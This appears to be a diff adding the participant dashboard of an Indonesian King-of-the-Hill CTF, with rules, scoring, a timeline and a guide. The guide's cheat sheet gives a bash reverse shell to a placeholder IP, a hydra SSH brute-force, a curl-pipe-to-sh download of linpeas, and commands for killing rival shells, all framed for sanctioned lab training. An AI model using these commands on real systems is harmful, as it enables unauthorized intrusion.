+            <div class="step-num">2</div>
+            <div class="step-body">
+                <h4>Tulis Nama Team ke /root/king.txt</h4>
+                <div class="code-block">
+echo "<span class="teamNamePlaceholder">team-name</span>" > /root/king.txt<button class="copy-btn" onclick="copyCode(this)">📋</button>
+                </div>
+                <p style="margin-top:8px;">⚠️ Nama harus <strong>PERSIS</strong> sama dengan team name yang terdaftar (case-sensitive). Cek di info team anda.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+                <h4>Pertahankan Akses</h4>
+                <p>Scorebot baca king.txt setiap 60 detik. Jika team lain overwrite → mereka jadi King. Defend!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>⏱️ Timeline Event</h3>
+        <table class="tbl">
+            <tbody>
+                <tr><td class="mono" style="font-weight:700;width:120px;">08:00</td><td>Gate Open — Registrasi ulang & setup VPN</td></tr>
+                <tr><td class="mono" style="font-weight:700;">08:30</td><td>Technical Briefing — Penjelasan mekanisme</td></tr>
+                <tr><td class="mono" style="font-weight:700;color:var(--accent-green);">09:00</td><td style="color:var(--accent-green);font-weight:700;">🚀 GAME START — Grace period 5 menit (no scoring)</td></tr>
+                <tr><td class="mono" style="font-weight:700;">09:05</td><td>Tick #1 — Scoring dimulai!</td></tr>
+                <tr><td class="mono" style="font-weight:700;">12:00</td><td>Lunch Break (game tetap berjalan!)</td></tr>
+                <tr><td class="mono" style="font-weight:700;color:var(--accent-orange);">14:30</td><td style="color:var(--accent-orange);">🧊 Scoreboard FREEZE — Score disembunyikan 30 menit terakhir</td></tr>
+                <tr><td class="mono" style="font-weight:700;color:var(--accent-red);">15:00</td><td style="color:var(--accent-red);font-weight:700;">🏁 GAME OVER — Final scoring</td></tr>
+                <tr><td class="mono" style="font-weight:700;">15:30</td><td>Pengumuman pemenang & ceremony</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- ─── GUIDE ─── -->
+<div class="page-section" id="sec-guide">
+    <h2 class="page-title">📖 Panduan Peserta</h2>
+
+    <div class="card" style="max-width:960px;">
+        <div id="pGuideContent" style="line-height:1.8; font-size:13px; color:var(--text-secondary);">
+            <p style="color:var(--text-muted); font-size:12px; margin-bottom:16px;">KoTH CTF — Participant Guide</p>
+
+            <!-- TOC -->
+            <details open style="margin-bottom:20px;">
+                <summary style="cursor:pointer; font-weight:700; color:var(--accent-cyan); font-size:14px;">📑 Daftar Isi</summary>
+                <ol style="padding-left:20px; margin-top:8px; font-size:12px; columns:2;">
+                    <li><a href="#p1" style="color:var(--accent-blue);">Apa itu King of the Hill?</a></li>
+                    <li><a href="#p2" style="color:var(--accent-blue);">Cara Bermain</a></li>
+                    <li><a href="#p3" style="color:var(--accent-blue);">Mekanisme Scoring</a></li>
+                    <li><a href="#p4" style="color:var(--accent-blue);">Dashboard Peserta</a></li>
+                    <li><a href="#p5" style="color:var(--accent-blue);">Live Scoreboard</a></li>
+                    <li><a href="#p6" style="color:var(--accent-blue);">Timeline Event</a></li>
+                    <li><a href="#p7" style="color:var(--accent-blue);">Peraturan &amp; Larangan</a></li>
+                    <li><a href="#p8" style="color:var(--accent-blue);">Tools &amp; Cheat Sheet</a></li>
+                    <li><a href="#p9" style="color:var(--accent-blue);">Strategi &amp; Tips</a></li>
+                    <li><a href="#p10" style="color:var(--accent-blue);">Troubleshooting</a></li>
+                    <li><a href="#p11" style="color:var(--accent-blue);">FAQ</a></li>
+                </ol>
+            </details>
+
+            <style>
+                #pGuideContent h3 { color:var(--accent-green); font-size:15px; margin:24px 0 10px; padding-bottom:6px; border-bottom:1px solid var(--border); }
+                #pGuideContent h4 { color:var(--accent-cyan); font-size:13px; margin:16px 0 6px; }
+                #pGuideContent pre { background:var(--bg-primary); border:1px solid var(--border); border-radius:6px; padding:10px 14px; font-family:var(--font-mono); font-size:11px; overflow-x:auto; margin:8px 0 12px; color:var(--accent-green); white-space:pre-wrap; word-break:break-all; }
+                #pGuideContent code { background:rgba(59,130,246,.12); color:var(--accent-cyan); padding:1px 5px; border-radius:3px; font-family:var(--font-mono); font-size:11px; }
+                #pGuideContent pre code { background:none; color:inherit; padding:0; }
+                #pGuideContent table { width:100%; border-collapse:collapse; font-size:12px; margin:8px 0 14px; }
+                #pGuideContent th { text-align:left; padding:6px 10px; background:var(--bg-secondary); color:var(--text-muted); font-weight:700; text-transform:uppercase; font-size:10px; letter-spacing:.5px; }
+                #pGuideContent td { padding:6px 10px; border-bottom:1px solid var(--border); }
+                #pGuideContent .warn { background:rgba(249,115,22,.1); border-left:3px solid var(--accent-orange); padding:8px 12px; border-radius:0 6px 6px 0; margin:8px 0; font-size:12px; }
+                #pGuideContent .danger { background:rgba(239,68,68,.1); border-left:3px solid var(--accent-red); padding:8px 12px; border-radius:0 6px 6px 0; margin:8px 0; font-size:12px; }
+                #pGuideContent ul, #pGuideContent ol { padding-left:20px; margin:6px 0; }
+                #pGuideContent li { margin-bottom:4px; }
+            </style>
+
+            <!-- 1. Apa itu KoTH -->
+            <h3 id="p1">1. Apa itu King of the Hill?</h3>
+            <p><strong>King of the Hill (KoTH)</strong> adalah format kompetisi CTF di mana tim-tim berlomba untuk:</p>
+            <ol>
+                <li>🔓 <strong>Meretas (Capture)</strong> server target ("Hill") melalui eksploitasi vulnerability</li>
+                <li>👑 <strong>Menjadi King</strong> dengan menulis nama tim ke file <code>/root/king.txt</code></li>
+                <li>🛡️ <strong>Mempertahankan (Defend)</strong> akses agar tetap King</li>
+                <li>💰 <strong>Mengumpulkan Poin</strong> — setiap 60 detik, King mendapat poin</li>
+            </ol>
+            <p>Semakin lama kamu memegang Hill, semakin banyak poin yang kamu dapat!</p>
+            <pre style="color:var(--text-primary); font-size:11px;">
+┌─────────────────────────────────────────────────────────┐
+│   4 Hills ─── Exploit ─── Root Access ─── king.txt     │
+│   Setiap 60 detik: Scorebot baca king.txt              │
+│   King + SLA hidup = +10 poin × multiplier             │
+│   Service mati = 0 poin (meskipun kamu King!)          │
+│   First Blood (pertama capture) = +50 bonus            │
+│   Defense Streak (3+ tick berturut) = +5 bonus/tick    │
+│   Hills di belakang Pivot = 1.5× multiplier            │
+│   Durasi: 6 jam | 30 menit terakhir = Scoreboard FREEZE│
+└─────────────────────────────────────────────────────────┘</pre>
+
+            <!-- 2. Cara Bermain -->
+            <h3 id="p2">2. Cara Bermain: Capture &amp; Defend</h3>
+            <h4>Step 1: Recon &amp; Scanning</h4>
+            <pre># Scan subnet untuk menemukan target hills
+nmap -sn 10.0.0.0/24
+
+# Setelah menemukan IP hill, scan port & services
+nmap -sT -sV -Pn -p- &lt;hill-ip&gt;
+gobuster dir -u http://&lt;hill-ip&gt; -w /usr/share/wordlists/dirb/common.txt</pre>
+            <h4>Step 2: Exploit &amp; Get Root</h4>
+            <pre>sudo -l                         # Check sudo permissions
+find / -perm -4000 2>/dev/null  # Find SUID binaries
+cat /etc/crontab                # Check cron jobs</pre>
+            <h4>Step 3: Claim the Hill! 👑</h4>
+            <pre>echo "team-name-kamu" > /root/king.txt</pre>
+            <div class="warn">⚠️ Nama harus <strong>PERSIS</strong> sama dengan Team Name yang terdaftar (case-sensitive). Cek di Dashboard → Info Team. File harus di <code>/root/king.txt</code>.</div>
+            <h4>Step 4: Defend! 🛡️</h4>
+            <pre># Ganti password root
+passwd root
+
+# Kill shell orang lain
+w
+ps aux | grep -E "ssh|bash|nc|python"
+kill -9 &lt;PID&gt;
+
+# Monitor king.txt
+watch -n 5 cat /root/king.txt
+
+# Protect king.txt
+chattr +i /root/king.txt</pre>
+            <div class="danger">⚠️ JANGAN MATIKAN SERVICE! Jika SLA mati, kamu mendapat <strong>0 poin</strong> meskipun kamu King!</div>
+
+            <!-- 3. Scoring -->
+            <h3 id="p3">3. Mekanisme Scoring</h3>
+            <h4>Scoring Formula</h4>
+            <pre>Poin per Tick = Base Points (10) × Hill Multiplier × SLA Status</pre>
+            <table>
+                <thead><tr><th>Komponen</th><th>Nilai</th></tr></thead>
+                <tbody>
+                    <tr><td>Base Points</td><td>10 poin per tick per hill</td></tr>
+                    <tr><td>Multiplier Hill 1 &amp; 2</td><td>1.0× → 10 poin/tick</td></tr>
+                    <tr><td>Multiplier Hill 3 &amp; 4</td><td>1.5× → 15 poin/tick</td></tr>
+                    <tr><td>SLA Down</td><td style="color:var(--accent-red);">0 poin!</td></tr>
+                </tbody>
+            </table>
+            <h4>Bonus Poin</h4>
+            <table>
+                <thead><tr><th>Bonus</th><th>Poin</th><th>Kondisi</th></tr></thead>
+                <tbody>
+                    <tr><td>🩸 First Blood</td><td>+50</td><td>Tim pertama capture hill (per hill, hanya sekali)</td></tr>
+                    <tr><td>🛡️ Defense Streak</td><td>+5/tick</td><td>Setelah memegang hill ≥ 3 tick berturut-turut</td></tr>
+                </tbody>
+            </table>
+            <h4>Contoh Perhitungan (Hill 1, 10 tick)</h4>
+            <pre>Tick 1: 10 × 1.0 = 10 poin (+ 50 first blood jika pertama)
+Tick 2: 10 × 1.0 = 10 poin
+Tick 3: 10 × 1.0 + 5 = 15 poin (streak bonus mulai!)
+Tick 4-10: 15 poin/tick
+Total: 60 + 40 + 50 (FB) = 150 poin</pre>
+            <h4>SLA Check</h4>
+            <table>
+                <thead><tr><th>Hill</th><th>SLA Check</th><th>Yang Dicek</th></tr></thead>
+                <tbody>
+                    <tr><td>Hill 1</td><td>HTTP</td><td>Response 200 OK dari port 80</td></tr>
+                    <tr><td>Hill 2</td><td>TCP</td><td>Koneksi TCP ke port 9999</td></tr>
+                    <tr><td>Hill 3</td><td>HTTP</td><td>Response 200 OK dari port 8080</td></tr>
+                    <tr><td>Hill 4</td><td>TCP</td><td>Koneksi TCP ke port 27017</td></tr>
+                </tbody>
+            </table>
+            <h4>Dual Verification</h4>
+            <p>Sistem menggunakan 2 metode: <strong>SSH Check</strong> (scorebot SSH ke hill) dan <strong>Agent Check</strong> (agent di hill melapor ke server). Jika salah satu gagal, metode lain tetap bisa digunakan.</p>
+            <h4>Scoreboard Freeze</h4>
+            <p>30 menit terakhir (14:30-15:00), scoreboard di-freeze. Score tetap dihitung tapi posisi di leaderboard tidak update. Setelah game selesai, scoreboard akan di-unfreeze untuk reveal hasil akhir.</p>
+
+            <!-- 4. Dashboard -->
+            <h3 id="p4">4. Dashboard Peserta</h3>
+            <p>After logging in, access the Dashboard at <code>/dashboard</code></p>
+            <table>
+                <thead><tr><th>Menu</th><th>Isi</th></tr></thead>
+                <tbody>
+                    <tr><td>🏠 Home</td><td>Overview — ranking, poin, hills owned, quick start</td></tr>
+                    <tr><td>🔐 VPN Setup</td><td>Panduan lengkap WireGuard/OpenVPN</td></tr>
+                    <tr><td>🗺️ Topology</td><td>Interactive network map</td></tr>
+                    <tr><td>📋 Rules</td><td>Peraturan, scoring, timeline</td></tr>
+                    <tr><td>📖 Guide</td><td>Panduan lengkap (halaman ini!)</td></tr>
+                    <tr><td>📊 Scoreboard</td><td>Live scoreboard publik</td></tr>
+                    <tr><td>📈 History</td><td>Grafik riwayat skor</td></tr>
+                </tbody>
+            </table>
+
+            <!-- 5. Scoreboard -->
+            <h3 id="p5">5. Live Scoreboard</h3>
+            <p><strong>URL:</strong> <code>/scoreboard</code></p>
+            <p>Displays: Timer &amp; Tick Counter, Hill Status Cards, Leaderboard (with category filter), Live Feed, WebSocket Status.</p>
+            <p>Scoreboard menggunakan <strong>WebSocket</strong> untuk update otomatis. Jika "OFFLINE", coba refresh halaman.</p>
+
+            <!-- 6. Timeline -->
+            <h3 id="p6">6. Timeline Event</h3>
+            <table>
+                <thead><tr><th>Waktu</th><th>Kegiatan</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>08:00</strong></td><td>🚪 Gate Open — Registrasi ulang &amp; setup VPN</td></tr>
+                    <tr><td><strong>08:30</strong></td><td>📋 Technical Briefing</td></tr>
+                    <tr><td style="color:var(--accent-green);"><strong>09:00</strong></td><td style="color:var(--accent-green);font-weight:700;">🚀 GAME START — Grace period 5 menit</td></tr>
+                    <tr><td><strong>09:05</strong></td><td>⚡ Tick #1 — Scoring mulai!</td></tr>
+                    <tr><td><strong>12:00</strong></td><td>🍽️ Lunch Break (game tetap berjalan!)</td></tr>
+                    <tr><td style="color:var(--accent-orange);"><strong>14:30</strong></td><td style="color:var(--accent-orange);">🧊 Scoreboard FREEZE</td></tr>
+                    <tr><td style="color:var(--accent-red);"><strong>15:00</strong></td><td style="color:var(--accent-red);font-weight:700;">🏁 GAME OVER</td></tr>
+                    <tr><td><strong>15:30</strong></td><td>🏆 Pengumuman Pemenang</td></tr>
+                </tbody>
+            </table>
+            <div class="warn">⚠️ Game tetap berjalan saat lunch break! Jika kamu tidak defend, hill-mu bisa direbut.</div>
+
+            <!-- 7. Rules -->
+            <h3 id="p7">7. Peraturan &amp; Larangan</h3>
+            <h4>✅ BOLEH</h4>
+            <ul>
+                <li>Exploit vulnerability di setiap Hill</li>
+                <li>Gunakan tools apapun (Kali Linux, Metasploit, custom scripts, dll)</li>
+                <li>Menyerang Hill yang dikuasai tim lain</li>
+                <li>Memasang backdoor di Hill (tapi jangan matikan service!)</li>
+                <li>Mengubah password root/user</li>
+                <li>Pivoting melalui Pivot DMZ</li>
+            </ul>
+            <h4>❌ DILARANG</h4>
+            <table>
+                <thead><tr><th>Pelanggaran</th><th>Konsekuensi</th></tr></thead>
+                <tbody>
+                    <tr><td>Attacking VPN Server</td><td style="color:var(--accent-red);">⛔ Disqualification</td></tr>
+                    <tr><td>Menyerang KoTH Server / Scoreboard</td><td style="color:var(--accent-red);">⛔ Diskualifikasi</td></tr>
+                    <tr><td>DoS/DDoS ke infrastruktur</td><td style="color:var(--accent-red);">⛔ Diskualifikasi</td></tr>
+                    <tr><td>Mematikan service Hill sengaja</td><td style="color:var(--accent-orange);">⚠️ Penalty poin (-50 s/d -200)</td></tr>
+                    <tr><td>Memanipulasi scoring system</td><td style="color:var(--accent-red);">⛔ Diskualifikasi</td></tr>
+                    <tr><td>Menggunakan akun/token tim lain</td><td style="color:var(--accent-red);">⛔ Diskualifikasi</td></tr>
+                </tbody>
+            </table>
+
+            <!-- 8. Tools -->
+            <h3 id="p8">8. Tools &amp; Cheat Sheet</h3>
+            <h4>Recommended Tools (Kali Linux)</h4>
+            <pre>sudo apt install -y nmap netcat-openbsd sqlmap hydra nikto gobuster \
+  john hashcat sshpass curl wget dirb
+pip3 install requests pwntools impacket paramiko</pre>
+            <h4>Recon</h4>
+            <pre># Ganti &lt;target&gt; dengan IP hill yang ditemukan dari scanning
+nmap -sT -sV -Pn -p- &lt;target&gt;
+gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt
+nikto -h http://&lt;target&gt;
+sqlmap -u "http://&lt;target&gt;/page?id=1" --batch</pre>
+            <h4>Exploitation</h4>
+            <pre># Reverse shell listener
+nc -lvnp 4444
+
+# Reverse shell payload (di target)
+bash -i >&amp; /dev/tcp/YOUR_VPN_IP/4444 0>&amp;1
+
+# SSH brute-force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://&lt;target&gt; -t 4</pre>
+            <h4>Privilege Escalation</h4>
+            <pre>id; whoami; sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+uname -a
+
+# LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+            <h4>King Claim &amp; Defense</h4>
+            <pre># CLAIM
+echo "team-name-kamu" > /root/king.txt
+
+# DEFEND
+passwd root
+pkill -u nobody
+kill -9 $(pgrep -f "nc|ncat")
+watch -n 5 cat /root/king.txt
+chattr +i /root/king.txt
+tail -f /var/log/auth.log
+ss -tlnp</pre>
+
+            <!-- 9. Strategi -->
+            <h3 id="p9">9. Strategi &amp; Tips</h3>
+            <h4>🎯 Strategi Umum</h4>
+            <ol>
+                <li><strong>Scan ALL hills dulu</strong> sebelum mulai exploit</li>
+                <li><strong>Prioritaskan hill mudah</strong> untuk first blood (+50)</li>
+                <li><strong>Hill 3 &amp; 4 (1.5×)</strong> lebih menguntungkan jangka panjang</li>
+                <li><strong>Defense streak</strong> (+5 setelah 3 tick) berharga — pertahankan!</li>
+                <li><strong>Jangan fokus 1 hill</strong> — hold minimal 2 hill sekaligus</li>
+                <li><strong>Pembagian tugas</strong> — 1-2 attack, 1-2 defend</li>
+            </ol>
+            <h4>🧠 Tips Pro</h4>
+            <ul>
+                <li><strong>Automate king claim:</strong> <code>while true; do echo "team" > /root/king.txt; sleep 10; done &amp;</code></li>
+                <li><strong>Setup SSH key</strong> setelah dapat root agar login tanpa password</li>
+                <li><strong>Pasang alarm</strong> jika king.txt berubah dengan <code>inotifywait</code></li>
+                <li><strong>Cek SLA</strong> dari perspektif kamu: <code>curl -s -o /dev/null -w "%{http_code}" http://&lt;hill-ip&gt;:&lt;port&gt;</code></li>
+                <li><strong>Jangan ubah firewall</strong> yang memblokir scorebot!</li>
+            </ul>
+            <h4>⏱️ Timing Strategy</h4>
+            <table>
+                <thead><tr><th>Fase</th><th>Waktu</th><th>Strategi</th></tr></thead>
+                <tbody>
+                    <tr><td>Early Game</td><td>09:00-10:00</td><td>Race for first blood! Scan &amp; exploit cepat</td></tr>
+                    <tr><td>Mid Game</td><td>10:00-13:00</td><td>Hold &amp; defend. Expand ke hill lain</td></tr>
+                    <tr><td>Late Game</td><td>13:00-14:30</td><td>Aggressive — rebut hill dari lawan</td></tr>
+                    <tr><td>Frozen Phase</td><td>14:30-15:00</td><td>All-out! Score dihitung tapi board hidden</td></tr>
+                </tbody>
+            </table>
+
+            <!-- 10. Troubleshooting -->
+            <h3 id="p10">10. Troubleshooting</h3>
+            <h4>Tidak Bisa Ping Hill</h4>
+            <ol>
+                <li>Pastikan VPN aktif: <code>sudo wg show</code></li>
+                <li>Cek routing: <code>ip route | grep 10.0</code></li>
+                <li>Cek firewall lokal: <code>sudo iptables -L -n</code></li>
+                <li>Coba MTU lebih kecil: <code>sudo ip link set mtu 1280 dev wg0</code></li>
+            </ol>
+            <h4>Hill 3 &amp; 4 Unreachable</h4>
+            <p>Hill 3 &amp; 4 ada di belakang Pivot. Kamu perlu scan dan temukan sendiri bagaimana cara mengaksesnya. Hint: coba scan pivot host untuk menemukan port mapping.</p>
+            <h4>King.txt Tidak Ke-detect</h4>
+            <ol>
+                <li>Nama <strong>PERSIS</strong> sama (case-sensitive)</li>
+                <li>Tidak boleh ada spasi/newline tambahan</li>
+                <li>File harus di <code>/root/king.txt</code></li>
+                <li>Cek: <code>cat -A /root/king.txt</code> (seharusnya <code>team-name$</code>)</li>
+            </ol>
+            <h4>Service Mati (SLA Fail)</h4>
+            <pre># Restart web service (Hill 1 contoh)
+systemctl restart apache2
+ss -tlnp | grep :80
+curl -s -o /dev/null -w "%{http_code}" http://localhost:80</pre>
+
+            <!-- 11. FAQ -->
+            <h3 id="p11">11. FAQ</h3>
+            <table>
+                <thead><tr><th>Pertanyaan</th><th>Jawaban</th></tr></thead>
+                <tbody>
+                    <tr><td>Apa itu "King"?</td><td>Tim yang namanya tertulis di <code>/root/king.txt</code>. King mendapat poin setiap tick (60 detik).</td></tr>
+                    <tr><td>Berapa lama grace period?</td><td>5 menit. Setelah game start, gunakan untuk recon awal!</td></tr>
+                    <tr><td>Apa itu First Blood?</td><td>Bonus 50 poin untuk tim pertama capture sebuah Hill.</td></tr>
+                    <tr><td>Apa itu Defense Streak?</td><td>Bonus +5/tick jika mempertahankan hill ≥ 3 tick berturut-turut.</td></tr>
+                    <tr><td>Service mati?</td><td>0 poin untuk tick itu, meskipun kamu King!</td></tr>
+                    <tr><td>Boleh ganti password root?</td><td>Boleh! Bagian dari defense. Jangan matikan service.</td></tr>
+                    <tr><td>30 menit terakhir?</td><td>Scoreboard freeze — score tetap dihitung tapi board hidden.</td></tr>
+                    <tr><td>Boleh pakai Metasploit?</td><td>Boleh. Tools apapun boleh. Yang dilarang: serang infrastruktur.</td></tr>
+                    <tr><td>Lupa token?</td><td>Hubungi panitia.</td></tr>
+                    <tr><td>king.txt isi apa?</td><td>Hanya Team Name (bukan Display Name). Satu baris, tanpa spasi. <code>echo "team-kamu" > /root/king.txt</code></td></tr>
+                </tbody>
+            </table>
+
+            <!-- Quick Reference -->
+            <h3 style="color:var(--accent-green);">📱 Quick Reference Card</h3>
+            <pre style="color:var(--text-primary); font-size:11px;">
+┌─────────────────────────────────────────────────────────┐
+│  KoTH CTF — Participant Quick Reference                  │
+├─────────────────────────────────────────────────────────┤
+│  SCOREBOARD:   /scoreboard                              │
+│  DASHBOARD:    .../dashboard                             │
+│  LOGIN:        .../login                                 │
+│                                                         │
+│  ── TARGETS ──                                          │
+│  Hill 1: 🔍 Scan to discover   — 1.0×                  │
+│  Hill 2: 🔍 Scan to discover   — 1.0×                  │
+│  Hill 3: 🔍 Behind Pivot       — 1.5×                  │
+│  Hill 4: 🔍 Behind Pivot       — 1.5×                  │
+│                                                         │
+│  ── CLAIM HILL ──                                       │
+│  echo "team-name-kamu" > /root/king.txt                 │
+│                                                         │
+│  ── SCORING ──                                          │
+│  King + SLA = 10 × multiplier poin/tick (60 detik)      │
+│  First Blood = +50 | Streak (≥3) = +5/tick              │
+│  SLA Down = 0 poin!                                     │
+│                                                         │
+│  ⛔ DILARANG: Attack VPN/KoTH/Scorebot + DoS            │
+└─────────────────────────────────────────────────────────┘</pre>
+
+            <p style="text-align:center; margin-top:20px; font-size:14px; font-weight:700; color:var(--accent-green);">Selamat bertanding! Semoga berhasil! ⚔️🏆</p>
+        </div>
+    </div>
+</div>
+
+</div><!-- main -->
+
+<script>
+/* ══════════════════════════════════════════════════
+   KoTH CTF — Team Dashboard JS
+   ══════════════════════════════════════════════════ */
+const API = window.location.origin + '/api';
+let teamData = null;
+
+// ── Topology state (declared early so initTopology can be called from setupUI) ──
+let topoInitialized = false;
+let nodes = [];
+let topoLinks = [];
+let topoLabels = [];
+let dragging = null;
+let dragOffX = 0, dragOffY = 0;
+let selectedNode = null;
+let topoScale = 1;
+const TOPO_ZOOM_MIN = 0.4, TOPO_ZOOM_MAX = 2.5;
+
+// ── Auth Check ──
+(function init() {
+    const role = sessionStorage.getItem('koth_role');
+    const token = sessionStorage.getItem('koth_team_token');
+    const stored = sessionStorage.getItem('koth_team');
+
+    if (role !== 'team' || !token || !stored) {
+        window.location.href = '/login';
+        return;
+    }
+
+    teamData = JSON.parse(stored);
+    setupUI();
+    loadHomeData();
+})();
+
+function setupUI() {
+    document.getElementById('navTeam').textContent = teamData.display_name || teamData.team_name;
+    const cat = teamData.category;
+    const catEl = document.getElementById('navCat');
+    catEl.textContent = (cat || 'default').toUpperCase();
+    catEl.className = 'cat-badge cat-team';
+
+    document.getElementById('welcomeName').textContent = teamData.display_name || teamData.team_name;
+    document.getElementById('qsTeamName').textContent = teamData.team_name;
+    document.querySelectorAll('.teamNamePlaceholder').forEach(el => el.textContent = teamData.team_name);
+    const teamSlug = (teamData?.team_name || 'team').replace(/\s+/g, '-').toLowerCase();
+    document.querySelectorAll('.vpnTeamSlug').forEach(el => el.textContent = teamSlug);
+    document.getElementById('vpnIpDisplay').textContent = teamData.vpn_ip || 'Belum di-assign';
+
+    // Team info table
+    document.querySelector('#teamInfoTbl tbody').innerHTML = `
+        <tr><td style="font-weight:700;width:140px;">Team Name</td><td class="mono">${esc(teamData.team_name)}</td></tr>
+        <tr><td style="font-weight:700;">Display Name</td><td>${esc(teamData.display_name)}</td></tr>
+        <tr><td style="font-weight:700;">Category</td><td><span class="badge badge-blue">${(teamData.category||'default').toUpperCase()}</span></td></tr>
+        <tr><td style="font-weight:700;">VPN IP</td><td class="mono">${teamData.vpn_ip||'-'}</td></tr>
+        <tr><td style="font-weight:700;">Team ID</td><td class="mono">#${teamData.team_id}</td></tr>
+    `;
+
+    // Determine active page from URL path
+    const PAGE_MAP = {
+        '/dashboard': 'home',
+        '/vpn': 'vpn',
+        '/topology': 'topology',
+        '/rules': 'rules',
+        '/guide': 'guide'
+    };
+    const currentPath = window.location.pathname;
+    const activePage = PAGE_MAP[currentPath] || 'home';
+
+    // Activate correct section based on URL
+    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+    const targetSec = document.getElementById('sec-' + activePage);
+    if (targetSec) targetSec.classList.add('active');
+
+    // Highlight active nav link
+    document.querySelectorAll('.nav-links a[data-page]').forEach(a => {
+        a.classList.toggle('active', a.dataset.page === activePage);
+    });
+
+    // Init topology if that's the active page (delay to ensure section is rendered)
+    if (activePage === 'topology') {
+        requestAnimationFrame(() => requestAnimationFrame(() => initTopology()));
+    }
+}
+
+function logout() {
+    sessionStorage.removeItem('koth_role');
+    sessionStorage.removeItem('koth_team_token');
+    sessionStorage.removeItem('koth_team');
+    window.location.href = '/login';
+}
+
+function esc(s) { if(!s) return ''; const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
+function copyCode(btn) {
+    const block = btn.parentElement;
+    const text = block.innerText.replace('📋 Copy','').replace('📋','').trim();
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(text);
+    } else {
+        const ta = document.createElement('textarea');
+        ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+        document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+        document.body.removeChild(ta);
+    }
+    btn.textContent = '✅'; setTimeout(() => btn.textContent = '📋', 1500);
+}
+
+// ── VPN Tabs & FAQ ──
+function switchVpnTab(tab, btn) {
+    document.querySelectorAll('.vpn-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.vpn-tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('vpnTab-' + tab).classList.add('active');
+}
+function toggleFaq(el) {
+    el.classList.toggle('open');
+}
+
+// ── VPN Config Download ──
+async function downloadVpnConfig(type) {
+    const status = document.getElementById('vpnDownloadStatus');
+    const btnWg = document.getElementById('btnDownloadWG');
+    const btnOvpn = document.getElementById('btnDownloadOVPN');
+    const token = sessionStorage.getItem('koth_team_token');
+    if (!token) { status.textContent = '❌ Login dulu!'; return; }
+
+    btnWg.disabled = true;
+    btnOvpn.disabled = true;
+    status.textContent = '⏳ Downloading...';
+    try {
+        const resp = await fetch(API + '/vpn/my-config', {
+            headers: { 'X-Team-Token': token }
+        });
+        if (!resp.ok) {
+            const err = await resp.json().catch(() => ({}));
+            status.textContent = '❌ ' + (err.detail || 'Gagal download');
+            btnWg.disabled = false;
+            btnOvpn.disabled = false;
+            return;
+        }
+        const wgText = await resp.text();
+        const teamName = (teamData?.team_name || 'team').replace(/\s+/g, '-').toLowerCase();
+
+        if (type === 'ovpn') {
+            // Convert WireGuard config to OpenVPN-compatible static key config
+            const lines = wgText.split('\n');
+            let endpoint = '', privateKey = '', address = '', dns = '';
+            for (const line of lines) {
+                const l = line.trim();
+                if (l.startsWith('PrivateKey')) privateKey = l.split('=').slice(1).join('=').trim();
+                if (l.startsWith('Address')) address = l.split('=').slice(1).join('=').trim();
+                if (l.startsWith('DNS')) dns = l.split('=').slice(1).join('=').trim();
+                if (l.startsWith('Endpoint')) endpoint = l.split('=').slice(1).join('=').trim();
+            }
+            const epParts = endpoint.split(':');
+            const serverIp = epParts[0] || '';
+            const serverPort = epParts[1] || '51820';
+            const vpnIp = address.split('/')[0] || '10.10.0.2';
+
+            const ovpnConfig = [
+                'client',
+                'dev tun',
+                'proto udp',
+                `remote ${serverIp} ${serverPort}`,
+                'resolv-retry infinite',
+                'nobind',
+                'persist-key',
+                'persist-tun',
+                'cipher AES-256-GCM',
+                'auth SHA256',
+                'verb 3',
+                '',
+                '# VPN Network Routes',
+                'route 10.10.0.0 255.255.255.0',
+                'route 10.0.0.0 255.255.255.0',
+                '',
+                `# Team: ${teamData?.team_name || 'unknown'}`,
+                `# VPN IP: ${vpnIp}`,
+                '',
+                '# NOTE: This is a template config generated from your WireGuard config.',
+                '# The actual VPN server uses WireGuard. Use WireGuard config for best compatibility.',
+                '# If your environment requires OpenVPN, contact panitia for manual setup.',
+            ].join('\n');
+
+            const blob = new Blob([ovpnConfig], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${teamName}.ovpn`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            status.textContent = '✅ OpenVPN config downloaded! (template — WireGuard recommended)';
+        } else {
+            const blob = new Blob([wgText], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `wg-${teamName}.conf`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            status.textContent = '✅ WireGuard config downloaded!';
+        }
+    } catch (e) {
+        status.textContent = '❌ Network error';
+        console.error('VPN download error:', e);
+    }
+    btnWg.disabled = false;
+    btnOvpn.disabled = false;
+}
+
+// ── Announcements ──
+function toWIB(isoStr) {
+    if (!isoStr) return '';
+    const d = new Date(isoStr + (isoStr.endsWith('Z') ? '' : 'Z'));
+    return d.toLocaleString('id-ID', { timeZone:'Asia/Jakarta', day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false });
+}
+async function loadAnnouncements() {
+    try {
+        const anns = await fetch(API + '/scoreboard/announcements?limit=10').then(r => r.json());
+        const el = document.getElementById('homeAnnouncements');
+        if (!anns || anns.length === 0) {
+            el.innerHTML = '<p style="color:var(--text-muted);font-size:13px;">Belum ada pengumuman</p>';
+            return;
+        }
+        el.innerHTML = anns.map(a => {
+            const cls = a.type === 'danger' ? 'danger' : a.type === 'warning' ? 'warning' : '';
+            return `<div class="ann-item ${cls}">
+                <div class="ann-time">${toWIB(a.created_at)}</div>
